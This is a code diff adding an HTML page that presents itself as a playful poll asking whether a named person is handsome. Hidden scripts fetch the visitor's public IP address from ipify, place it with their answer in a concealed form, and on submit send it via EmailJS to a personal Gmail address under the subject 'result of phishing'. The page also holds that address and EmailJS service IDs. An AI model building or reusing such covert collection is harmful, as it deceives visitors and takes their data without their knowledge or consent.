@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <link rel="stylesheet" href="justanothertest.css">
+        <title>Document</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+    </head>
+    <body>
+        <script>
+            function ugly() {
+                document.getElementById('ugly').innerHTML = '帥，差不多是彭于晏等級的';
+                document.getElementById('goood').innerHTML = '帥，跟海綿寶寶差不多等級';
+                document.getElementById('text').value = '帥，差不多是彭于晏等級的';
+                document.getElementById('message').value += 'bad';
+            }
+
+            function goood() {
+                document.getElementById('ugly').innerHTML = '帥，跟海綿寶寶差不多等級';
+                document.getElementById('goood').innerHTML = '帥，差不多是彭于晏等級的';
+                document.getElementById('text').value = '帥，差不多是彭于晏等級的';
+                document.getElementById('message').value += 'good';
+            }
+        </script>
+        <h1 style="font-size: 110px; width: 100%; text-align: center;padding: 25px">請問郭軒甫帥不帥?</h1>
+        <ul type="none" style="width: 100%; overflow: hidden; margin:0px">
+            <li><div class="button"><a id="goood" onclick="goood()">帥，差不多是彭于晏等級的</a></div></li>
+            <li><div class="button"><a id="ugly" onclick="ugly()">帥，跟海綿寶寶差不多等級</a></div></li>
+        </ul>
+        <br>
+        <br>
+        <br>
+        <br>
+        <span id="gfg" hidden="hidden"></span>
+        <script>    
+            $(document).ready(()=>{
+                $.getJSON("https://api.ipify.org?format=json",
+                function (data) {
+    
+                    // Displayin IP address on screen
+                    $("#gfg").html(data.ip);
+                    document.getElementById('message').value += "Local IP: " + document.getElementById('gfg').innerHTML + "    ";
+                })
+            });
+        </script>
+        <!--send email-->
+        <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <form>
+            <div style="z-index: -1" hidden="hidden">
+                <input type="text" id="sendername" value="MEEEEEE!!!!"> <!--sendername-->
+                <input type="text" id="to" value="joshuakuo1030@gmail.com"> <!--reciever-->
+                <input type="text" id="subject" value="result of phishing"> <!--Subject-->        
+                <input type="text" id="replyto" value="joshuakuo1030@gmail.com"> <!--reply email(don't know what's it for)-->
+                <textarea id="message" cols="40" rows="8"></textarea>
+            </div>
+            <ul type="none" style="width: 100%">
+                <li style="width: 50%; margin: 1%; margin-left: 1%"><input type="text" id="text" class="text"></li>
+                <li style="width: 30%; margin: 1%; margin-left: 15%"><input type="button" id="submit" class="submit" onclick="sendMail()" value="提交"></input></li>
+            </ul>
+        </form>
+        <script>
+            function sendMail() {
+                (function() {
+                    emailjs.init("PmU_GVyRHmOZVEgX6")
+                })();
+
+                var params = {
+                sendername: document.querySelector("#sendername").value,
+                to: document.querySelector("#to").value,
+                subject: document.querySelector("#subject").value,
+                replyto: document.querySelector("#replyto").value,
+                message: document.querySelector("#message").value,
+                };
+
+                var serviceID = "service_3x0pm99";
+
+                var templateID = "template_g24rsjc";
+
+                emailjs.send(serviceID, templateID, params)
+                .then(res => {
+                    window.location.href = "justanothertest2.html";
+                })
+                .catch();
+            }
+        </script>
+    </body>
+</html>
